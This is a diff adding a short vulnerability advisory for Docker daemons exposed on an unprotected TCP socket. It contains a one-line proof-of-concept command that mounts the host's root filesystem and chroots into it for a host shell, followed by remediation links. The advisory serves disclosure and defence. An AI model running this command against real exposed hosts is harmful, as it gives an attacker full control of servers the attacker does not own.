@@ -1,0 +1,21 @@
+# Exploit Title: Docker Daemon - Unprotected TCP Socket
+# Date: 20-07-2017
+# Exploit Author: Martin Pizala
+# Vendor Homepage: https://www.docker.com
+# Software Link: https://www.docker.com/get-docker
+# Version: Since 0.4.7 (2013-06-28) (feature: mount host directories)
+# Tested on: Docker CE 17.06.0-ce and Docker Engine 1.13.1
+ 
+1. Description
+
+Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container and use chroot to escape the container-jail.
+
+2. Proof of Concept
+
+docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
+
+3. Solution:
+
+Protect the tcp socket
+https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket
+https://docs.docker.com/engine/security/https/
